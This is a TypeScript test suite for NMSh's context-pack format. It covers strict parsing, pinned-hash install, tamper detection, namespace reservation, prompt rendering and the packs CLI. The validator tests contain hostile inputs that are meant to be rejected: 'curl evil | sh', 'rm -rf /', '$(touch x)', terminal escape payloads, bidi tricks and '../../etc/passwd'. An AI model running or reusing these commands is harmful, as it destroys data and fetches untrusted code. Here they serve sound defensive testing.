import test from 'node:test';
import assert from 'node:assert/strict';
import {chmod, mkdir, mkdtemp, readdir, readFile, realpath, rm, symlink, writeFile} from 'node:fs/promises';
import {tmpdir} from 'node:os';
import {join} from 'node:path';
import {CONTEXT_API_VERSION, PACK_SCHEMA, parsePack, satisfiesRange, type ContextPack} from '../src/context/packs/schema.js';
import {activeInstalledPacks, inspectPack, installedPackStatuses, installPack, removePack, setPackEnabled} from '../src/context/packs/store.js';
import {allModuleDefinitions, firstPartyDefaultModules, firstPartyPacks, moduleDefinition, packModuleDefinition, setInstalledPacks} from '../src/context/modules.js';
import {declarativeSegments, formatValue} from '../src/context/declarative.js';
import {recommendModules} from '../src/context/packs/recommend.js';
import {contextDemand} from '../src/context/demand.js';
import {CORE_CAPABILITIES} from '../src/context/registry.js';
import {DEFAULT_PROMPT_CONFIGURATION, normalizePromptConfiguration} from '../src/prompt/configuration.js';
import {buildContextRail, nativePromptSnapshot, buildContextLine} from '../src/prompt/prompt.js';
import {routeModule} from '../src/context/surfaceRouter.js';
import type {ContextFact, ContextFacts} from '../src/context/facts.js';
import {setIconStyle} from '../src/ui/glyphs.js';
import {stripAnsi} from '../src/util/text.js';

const CAPABILITIES = new Map(CORE_CAPABILITIES.map(capability => [capability.id, capability]));

function pack(overrides: Partial<ContextPack> = {}): ContextPack {
  return {schema: PACK_SCHEMA, id: 'acme.infra', version: '1.0.0', name: 'Acme infra', description: 'Acme context.', license: 'MIT',
    provenance: {author: 'Acme'}, compatibility: {contextApi: CONTEXT_API_VERSION}, requires: ['infra.terraform'],
    modules: [{id: 'tf', label: 'Acme TF', description: 'Workspace.', category: 'infrastructure', priority: 50, role: 'context', icon: 'cubes',
      condition: 'onCommand', triggers: ['terraform'], segments: [{label: 'tf', parts: [{fact: 'infra.terraform', field: 'workspace'}]}]}], ...overrides};
}
const bytes = (value: unknown) => JSON.stringify(value);

function fact(value: unknown, overrides: Partial<ContextFact<unknown>> = {}): ContextFact<unknown> {
  return {value, source: {capability: 'x', evidence: 'fixture'}, collectedAt: 1, freshness: 'fresh', trust: 'workspace', sensitivity: 'public',
    persistence: 'snapshot-safe', resolution: 'bounded-async', ...overrides};
}

test('bundled first-party packs are data that pass the same validator; their ids, triggers and defaults are coherent', () => {
  const packs = firstPartyPacks();
  assert.ok(packs.length >= 6);
  for (const parsed of packs) {
    assert.ok(parsed.pack.id.startsWith('nmsh.'));
    assert.equal(parsed.pack.license, 'GPL-3.0-only');
    assert.match(parsed.sha256, /^[a-f0-9]{64}$/u);
    for (const module of parsed.pack.modules) {
      const definition = moduleDefinition(`${parsed.pack.id}:${module.id}`)!;
      assert.ok(definition.facts.size > 0, `${definition.id} demands facts`);
      for (const [capability, fields] of definition.facts) for (const field of fields) assert.ok(CAPABILITIES.get(capability)!.fields.includes(field), `${capability}.${field}`);
    }
  }
  const defaults = firstPartyDefaultModules();
  assert.ok(defaults.every(module => module.surface === 'auto'));
  assert.ok(defaults.filter(module => module.visible).every(module => module.condition === 'onCommand'), 'only show-on-command context is visible by default');
  assert.equal(new Set(allModuleDefinitions().map(definition => definition.id)).size, allModuleDefinitions().length);
});

test('the pack format is strict: unknown keys, code-shaped fields, controls and over-bounds are rejected', () => {
  const ok = parsePack(bytes(pack()), CAPABILITIES);
  assert.ok(ok.ok);
  const invalid = (value: unknown, pattern: RegExp) => {
    const result = parsePack(typeof value === 'string' ? value : bytes(value), CAPABILITIES);
    assert.ok(!result.ok && result.problem.kind === 'invalid', JSON.stringify(result));
    assert.match((result as {problem: {message: string}}).problem.message, pattern);
  };
  invalid({...pack(), command: 'curl evil | sh'}, /pack\.command: is not part of the pack format/u);
  invalid(pack({modules: [{...pack().modules[0]!, exec: ['rm', '-rf', '/']} as never]}), /exec: is not part of the pack format/u);
  invalid(pack({modules: [{...pack().modules[0]!, segments: [{parts: [{text: 'x', template: '${process.env.HOME}'} as never]}]}]}), /template: is not part/u);
  invalid(pack({name: 'evil\u001b]52;c;payload\u0007'}), /control or bidirectional/u);
  invalid(pack({description: 'safe\u202etxt.exe'}), /control or bidirectional/u);
  invalid(pack({id: '../escape'}), /pack\.id: has an invalid format/u);
  invalid(pack({version: '1.0'}), /pack\.version/u);
  invalid(pack({modules: Array.from({length: 25}, (_, i) => ({...pack().modules[0]!, id: `m${i}`}))}), /pack\.modules: must be a list of 1-24/u);
  invalid(pack({requires: []}), /must declare infra\.terraform/u);
  invalid(pack({modules: [{...pack().modules[0]!, condition: 'onCommand', triggers: undefined} as never]}), /triggers: is required/u);
  invalid(pack({modules: [{...pack().modules[0]!, triggers: ['$(touch x)']}]}), /invalid format/u);
  invalid(pack({provenance: {author: 'a', source: 'http://insecure.example'}}), /provenance\.source/u);
  invalid('{"schema": "nmsh.context-pack/v1"', /not valid JSON/u);
  invalid('x'.repeat(70 * 1024), /larger than 64 KiB/u);
  invalid(pack({recommend: [{module: 'nope', evidence: [{kind: 'workspaceFile', names: ['../../etc/passwd']}]}]}), /names|invalid format/u);
  const unsupported = parsePack(bytes(pack({requires: ['cloud.oracle'], modules: [{...pack().modules[0]!, segments: [{parts: [{fact: 'cloud.oracle', field: 'tenancy'}]}]}]})), CAPABILITIES);
  assert.ok(!unsupported.ok && unsupported.problem.kind === 'unsupported' && unsupported.problem.missing?.includes('cloud.oracle'), 'unknown capabilities: unsupported, not executed');
  const field = parsePack(bytes(pack({modules: [{...pack().modules[0]!, segments: [{parts: [{fact: 'infra.terraform', field: 'secretKey'}]}]}]})), CAPABILITIES);
  assert.ok(!field.ok && field.problem.kind === 'unsupported');
  const future = parsePack(bytes({...pack(), schema: 'nmsh.context-pack/v9'}), CAPABILITIES);
  assert.ok(!future.ok && future.problem.kind === 'unsupported');
  assert.ok(satisfiesRange('0.18.0', '>=0.17.0') && !satisfiesRange('0.16.9', '>=0.17.0') && satisfiesRange('0.18.0', '>=0.17.0 <1.0.0'));
});

test('local pack lifecycle: inspect, pinned install, replace, tamper detection, disable and atomic removal', async () => {
  const root = await realpath(await mkdtemp(join(tmpdir(), 'nmsh-packs-')));
  const directory = join(root, 'context-packs');
  try {
    const file = join(root, 'acme.json');
    await writeFile(file, bytes(pack()));
    const inspected = await inspectPack(file, '0.18.0');
    assert.ok(inspected.ok);
    assert.equal((await installPack(file, {directory, nmshVersion: '0.18.0', expectedSha256: '0'.repeat(64)})).ok, false, 'a pinned hash must match');
    assert.equal((await readdir(root)).includes('context-packs'), false, 'nothing written on refusal');
    const installed = await installPack(file, {directory, nmshVersion: '0.18.0', expectedSha256: inspected.ok ? inspected.parsed.sha256 : ''});
    assert.ok(installed.ok);
    let statuses = await installedPackStatuses(directory, '0.18.0');
    assert.deepEqual(statuses.map(status => [status.record.id, status.state]), [['acme.infra', 'enabled']]);
    assert.equal((await activeInstalledPacks(directory, '0.18.0')).length, 1);
    await writeFile(file, bytes(pack({version: '1.1.0'})));
    const conflict = await installPack(file, {directory, nmshVersion: '0.18.0'});
    assert.ok(!conflict.ok && conflict.conflict?.installedVersion === '1.0.0', 'a different version needs an explicit replace');
    const replaced = await installPack(file, {directory, nmshVersion: '0.18.0', replace: true});
    assert.ok(replaced.ok && replaced.replaced === '1.0.0');
    assert.deepEqual((await readdir(directory)).sort(), ['acme.infra@1.1.0.json', 'installed.json'], 'the old version and staging files are gone');
    // Editing an installed manifest on disk is detected, never trusted.
    await writeFile(join(directory, 'acme.infra@1.1.0.json'), bytes(pack({version: '1.1.0', name: 'Tampered'})));
    statuses = await installedPackStatuses(directory, '0.18.0');
    assert.equal(statuses[0]!.state, 'integrity-failed');
    assert.equal((await activeInstalledPacks(directory, '0.18.0')).length, 0);
    await installPack(file, {directory, nmshVersion: '0.18.0', replace: true});
    assert.equal((await setPackEnabled('acme.infra', false, directory)).ok, true);
    assert.equal((await installedPackStatuses(directory, '0.18.0'))[0]!.state, 'disabled');
    assert.equal((await activeInstalledPacks(directory, '0.18.0')).length, 0);
    assert.equal((await installedPackStatuses(directory, '0.17.0')).length, 1);
    assert.ok((await removePack('acme.infra', directory)).ok);
    assert.deepEqual(await readdir(directory), ['installed.json']);
    assert.deepEqual(JSON.parse(await readFile(join(directory, 'installed.json'), 'utf8')).packs, []);
    // Reserved namespace, incompatible NMSh, symlinks and unreadable files.
    await writeFile(file, bytes(pack({id: 'nmsh.evil'})));
    assert.match((await installPack(file, {directory, nmshVersion: '0.18.0'}) as {reason: string}).reason, /reserved/u);
    await writeFile(file, bytes(pack({compatibility: {contextApi: 1, nmsh: '>=9.0.0'}})));
    assert.match((await installPack(file, {directory, nmshVersion: '0.18.0'}) as {reason: string}).reason, /needs NMSh >=9\.0\.0/u);
    await writeFile(join(root, 'real.json'), bytes(pack()));
    await symlink(join(root, 'real.json'), join(root, 'link.json'));
    assert.match((await installPack(join(root, 'link.json'), {directory, nmshVersion: '0.18.0'}) as {reason: string}).reason, /symbolic links/u);
    await chmod(join(root, 'real.json'), 0o000);
    if (process.getuid?.() !== 0) assert.equal((await installPack(join(root, 'real.json'), {directory, nmshVersion: '0.18.0'})).ok, false);
  } finally { await chmod(join(root, 'real.json'), 0o600).catch(() => {}); await rm(root, {recursive: true, force: true}); }
});

test('installed pack modules join the catalog; a removed pack leaves its configured modules as missing, never crashing', () => {
  const parsed = parsePack(bytes(pack()), CAPABILITIES);
  assert.ok(parsed.ok);
  try {
    setInstalledPacks([parsed.parsed]);
    assert.equal(moduleDefinition('acme.infra:tf')?.pack?.builtIn, false);
    const config = normalizePromptConfiguration({modules: [{id: 'acme.infra:tf', visible: true, condition: 'onCommand', surface: 'contextRail'}]});
    assert.ok(config.modules.some(module => module.id === 'acme.infra:tf'));
    setInstalledPacks([]);
    const stillSaved = normalizePromptConfiguration(JSON.parse(JSON.stringify(config)));
    assert.deepEqual(stillSaved.modules.find(module => module.id === 'acme.infra:tf'), {id: 'acme.infra:tf', visible: true, condition: 'onCommand', surface: 'contextRail'},
      'settings for a missing pack are kept for when it returns');
    assert.equal(routeModule(stillSaved.modules.find(module => module.id === 'acme.infra:tf')!), 'hidden');
    const facts = {'infra.terraform': fact({workspace: 'prod', tool: 'terraform'})} as ContextFacts;
    assert.doesNotThrow(() => buildContextRail({cwd: '/w', project: 'w', facts, commandWords: ['terraform']}, 80, stillSaved));
    assert.equal(normalizePromptConfiguration({modules: [{id: 'Acme:Bad', visible: true, condition: 'always'}, {id: 'x'.repeat(200), visible: true, condition: 'always'}]})
      .modules.filter(module => module.id.includes(':') && !module.id.startsWith('nmsh.')).length, 0, 'malformed module ids are dropped');
  } finally { setInstalledPacks([]); }
});

test('declarative rendering: formatters, conditions, joins, emphasis, glyph modes and policy-filtered snapshots', () => {
  const claude = moduleDefinition('nmsh.agents:claude')!;
  const limits = moduleDefinition('nmsh.agents:claude-limits')!;
  const now = Date.UTC(2026, 9, 6, 12);
  const facts = {'agent.claude': fact({model: 'Opus', effort: 'max', contextPercent: 43.4, updatedAt: now - 1000, fiveHourPercent: 61, fiveHourResetsAt: now + 3_600_000,
    sevenDayPercent: 18, sevenDayResetsAt: now - 1}, {persistence: 'display-only'})} as ContextFacts;
  setIconStyle('nerd');
  const nerd = declarativeSegments(claude, facts, {icons: 'nerd', glyphs: 'nerd', now, purpose: 'display'});
  assert.deepEqual(nerd.map(segment => segment.text), ['✻ Opus · Max · CTX 43%']);
  assert.equal(nerd[0]!.role, 'project');
  const safe = declarativeSegments(claude, facts, {icons: 'nerd', glyphs: 'safe', now, purpose: 'display'});
  assert.deepEqual(safe.map(segment => segment.text), ['Claude Opus · Max · CTX 43%'], 'Safe mode uses the text label');
  assert.deepEqual(declarativeSegments(limits, facts, {icons: 'nerd', glyphs: 'nerd', now, purpose: 'display'}).map(segment => segment.text), ['5H 61%'],
    'a reset window disappears instead of showing stale usage');
  const old = {'agent.claude': fact({model: 'Opus', contextPercent: 91, updatedAt: now - 10 * 60_000})} as ContextFacts;
  const stale = declarativeSegments(claude, old, {icons: 'nerd', glyphs: 'safe', now, purpose: 'display'});
  assert.deepEqual(stale.map(segment => [segment.text, segment.role]), [['Claude Opus · CTX 91% · 10m ago', 'failure']], 'emphasis and age disclosure');
  assert.deepEqual(declarativeSegments(claude, facts, {icons: 'nerd', glyphs: 'nerd', now, purpose: 'snapshot'}), [], 'display-only facts never enter snapshots');
  const node = moduleDefinition('nmsh.project:node')!;
  const runtime = (value: unknown) => declarativeSegments(node, {'runtime.node': fact(value)} as ContextFacts, {icons: 'off', glyphs: 'nerd', now, purpose: 'display'}).map(segment => segment.text);
  assert.deepEqual(runtime({active: '22.11.0', requested: '22', requestedFrom: '.nvmrc'}), ['node 22.11.0']);
  assert.deepEqual(runtime({active: '20.1.0', requested: '22', requestedFrom: '.nvmrc', mismatch: true}), ['node 20.1.0 · .nvmrc 22']);
  assert.deepEqual(runtime({requested: '22', requestedFrom: '.nvmrc'}), ['node 22']);
  assert.deepEqual(runtime({}), []);
  const hostile = runtime({active: '1.0\u001b]8;;http://evil\u0007x\u202e'});
  assert.ok(hostile.every(text => !/[\u0000-\u001f\u202a-\u202e]/u.test(text)), 'display boundary applies to pack text too');
  assert.equal(formatValue(Date.UTC(2026, 0, 1) + 90_000, 'until', Date.UTC(2026, 0, 1)), '1m left');
  assert.equal(formatValue(Date.UTC(2026, 0, 1) - 1, 'until', Date.UTC(2026, 0, 1)), 'expired');
  assert.equal(formatValue('stable-aarch64-apple-darwin', 'toolchain', 0), 'stable');
  assert.equal(formatValue({nested: true}, 'text', 0), undefined, 'only scalars are presentable');
});

test('pack modules render through the shared Native pipeline: show-on-command, Rail, policy-filtered snapshots', () => {
  const configuration = structuredClone(DEFAULT_PROMPT_CONFIGURATION);
  const facts = {'cloud.aws': fact({profile: 'prod-admin', region: 'eu-west-1', account: '123456789012'},
    {fieldPolicy: {account: {sensitivity: 'private', persistence: 'display-only'}}})} as ContextFacts;
  const context = {cwd: '/w', project: 'w', facts, commandWords: ['aws']};
  setIconStyle('safe');
  try {
    assert.match(buildContextRail(context, 100, configuration).map(stripAnsi).join(''), /aws prod-admin \(eu-west-1\)/u);
    assert.deepEqual(buildContextRail({...context, commandWords: ['ls']}, 100, configuration), [], 'show-on-command');
    assert.ok(!stripAnsi(buildContextLine(context, 120, configuration)).includes('prod-admin'), 'Auto routes cloud context to the Rail, not the Main Prompt');
    const main = structuredClone(configuration);
    main.modules = main.modules.map(module => module.id === 'nmsh.cloud:aws' ? {...module, surface: 'mainPrompt'} : module);
    assert.match(stripAnsi(buildContextLine(context, 160, main)), /prod-admin/u);
    const snapshot = JSON.stringify(nativePromptSnapshot(context, main));
    assert.match(snapshot, /prod-admin/u);
    assert.doesNotMatch(snapshot, /123456789012/u, 'private fields stay out of snapshots');
  } finally { setIconStyle('nerd'); }
});

test('demand: only visible, routed and relevant modules request capabilities; hidden or disabled ones cost nothing', () => {
  const configuration = structuredClone(DEFAULT_PROMPT_CONFIGURATION);
  const input = {commandWords: [] as string[], nativePrompt: true, railVisible: true, statusStripVisible: false, inRepository: true};
  const idle = contextDemand(configuration, input);
  assert.ok(![...idle.keys()].some(id => id.startsWith('cloud.') || id.startsWith('runtime.') || id.startsWith('agent.')), [...idle.keys()].join(','));
  const typing = contextDemand(configuration, {...input, commandWords: ['aws']});
  assert.deepEqual([...typing.get('cloud.aws') ?? []].sort(), ['credentials', 'expiresAt', 'profile', 'region']);
  assert.ok(!typing.has('cloud.gcp'));
  assert.equal(contextDemand(configuration, {...input, commandWords: ['aws'], railVisible: false}).has('cloud.aws'), false, 'Rail Off demands nothing for Rail modules');
  assert.equal(contextDemand(configuration, {...input, commandWords: ['aws'], nativePrompt: false}).size, 0, 'external providers render no Native modules');
  configuration.modules = configuration.modules.map(module => ({...module, visible: false}));
  assert.equal(contextDemand(configuration, {...input, commandWords: ['aws', 'terraform', 'claude']}).size, 0, 'nothing visible, nothing demanded');
});

test('recommendations explain local evidence and never enable anything', () => {
  const configuration = structuredClone(DEFAULT_PROMPT_CONFIGURATION);
  const before = JSON.stringify(configuration);
  const recommendations = recommendModules(configuration, {workspaceNames: new Set(['main.tf', 'variables.tf', 'Pulumi.yaml', 'package.json']), executables: new Set(['claude']),
    facts: {'project.package': fact({name: 'x'})} as ContextFacts}, firstPartyPacks());
  const byModule = new Map(recommendations.map(item => [item.module, item.reasons]));
  assert.deepEqual(byModule.get('nmsh.project:node'), ['package.json in this project']);
  assert.deepEqual(byModule.get('nmsh.project:package'), ['local configuration found']);
  assert.ok(!byModule.has('nmsh.infrastructure:terraform'), 'already visible modules are not recommended');
  assert.ok(!byModule.has('nmsh.agents:claude'));
  assert.equal(JSON.stringify(configuration), before, 'recommendation changes nothing');
  const hidden = structuredClone(DEFAULT_PROMPT_CONFIGURATION);
  hidden.modules = hidden.modules.map(module => module.id === 'nmsh.infrastructure:terraform' ? {...module, visible: false} : module);
  assert.deepEqual(recommendModules(hidden, {workspaceNames: new Set(['main.tf', 'variables.tf', 'vpc.tf']), executables: new Set(), facts: {}}, firstPartyPacks())
    .find(item => item.module === 'nmsh.infrastructure:terraform')?.reasons, ['main.tf, variables.tf and 1 more in this project']);
});

test('pack module definitions demand exactly the fields their parts name', () => {
  const parsed = parsePack(bytes(pack({requires: ['cloud.aws'], modules: [{...pack().modules[0]!, segments: [{parts: [{fact: 'cloud.aws', field: 'profile'},
    {fact: 'cloud.aws', field: 'expiresAt', optional: true, format: 'until'}]}]}]})), CAPABILITIES);
  assert.ok(parsed.ok);
  const definition = packModuleDefinition(parsed.parsed, parsed.parsed.pack.modules[0]!, false);
  assert.deepEqual([...definition.facts.get('cloud.aws')!].sort(), ['expiresAt', 'profile']);
});

test('the reserved first-party namespace cannot be shadowed by an installed pack', async () => {
  const forged = parsePack(bytes(pack({id: 'nmsh.cloud', version: '9.9.9'})), CAPABILITIES);
  assert.ok(forged.ok);
  try {
    setInstalledPacks([forged.parsed]);
    assert.equal(moduleDefinition('nmsh.cloud:tf'), undefined);
    assert.equal(moduleDefinition('nmsh.cloud:aws')?.pack?.builtIn, true);
  } finally { setInstalledPacks([]); }
  const root = await realpath(await mkdtemp(join(tmpdir(), 'nmsh-packs-')));
  try {
    await mkdir(join(root, 'context-packs'));
    await writeFile(join(root, 'context-packs', 'installed.json'), '{broken');
    await writeFile(join(root, 'p.json'), bytes(pack()));
    const outcome = await installPack(join(root, 'p.json'), {directory: join(root, 'context-packs'), nmshVersion: '0.18.0'}).catch(error => ({ok: false, reason: String(error)}));
    assert.equal(outcome.ok, false, 'an unreadable registry is left untouched rather than overwritten');
    assert.equal(await readFile(join(root, 'context-packs', 'installed.json'), 'utf8'), '{broken');
  } finally { await rm(root, {recursive: true, force: true}); }
});

test('`nmsh packs`: list, inspect with disclosure, confirmed install adds hidden modules, enable/disable, remove cleans up', async () => {
  const {runPacksCommand} = await import('../src/cli/packsCommand.js');
  const {loadPromptConfiguration} = await import('../src/prompt/configuration.js');
  const root = await realpath(await mkdtemp(join(tmpdir(), 'nmsh-packs-cli-')));
  const env = {XDG_CONFIG_HOME: join(root, 'config'), HOME: root};
  let out = '', err = '';
  const io = (confirm?: boolean) => ({out: (text: string) => { out += text; }, err: (text: string) => { err += text; }, env, version: '0.18.0',
    ...(confirm === undefined ? {} : {confirm: async () => confirm})});
  try {
    assert.equal(await runPacksCommand([], io()), 0);
    assert.match(out, /nmsh\.cloud +1\.0\.0 +Cloud/u);
    assert.match(out, /Installed: none/u);
    const file = join(root, 'acme.json');
    await writeFile(file, bytes(pack()));
    out = '';
    assert.equal(await runPacksCommand(['inspect', file], io()), 0);
    assert.match(out, /infra\.terraform: \*\.tf, \*\.tofu file names/u, 'inspection discloses exactly what core will read');
    assert.match(out, /acme\.infra:tf — Acme TF/u);
    assert.equal(await runPacksCommand(['install', file], io(false)), 1, 'declining installs nothing');
    assert.equal(await runPacksCommand(['install', file], io()), 2, 'non-interactive install needs --yes');
    assert.equal(await runPacksCommand(['install', file, '--yes'], io()), 0);
    const configPath = join(root, 'config', 'nmsh', 'config.json');
    const installed = loadPromptConfiguration(configPath).modules.find(module => module.id === 'acme.infra:tf');
    assert.deepEqual(installed, {id: 'acme.infra:tf', visible: false, condition: 'onCommand', surface: 'auto'}, 'modules arrive hidden');
    out = '';
    await runPacksCommand(['disable', 'acme.infra'], io());
    await runPacksCommand([], io());
    assert.match(out, /acme\.infra +1\.0\.0 +disabled/u);
    assert.equal(await runPacksCommand(['remove', 'acme.infra', '--yes'], io()), 0);
    assert.equal(loadPromptConfiguration(configPath).modules.some(module => module.id.startsWith('acme.infra:')), false);
    await writeFile(file, '{"schema": "nmsh.context-pack/v1", "id": "x.y", "exec": "rm -rf /"}');
    err = '';
    assert.equal(await runPacksCommand(['install', file, '--yes'], io()), 1);
    assert.match(err, /Invalid Context Pack/u);
  } finally { await rm(root, {recursive: true, force: true}); }
});
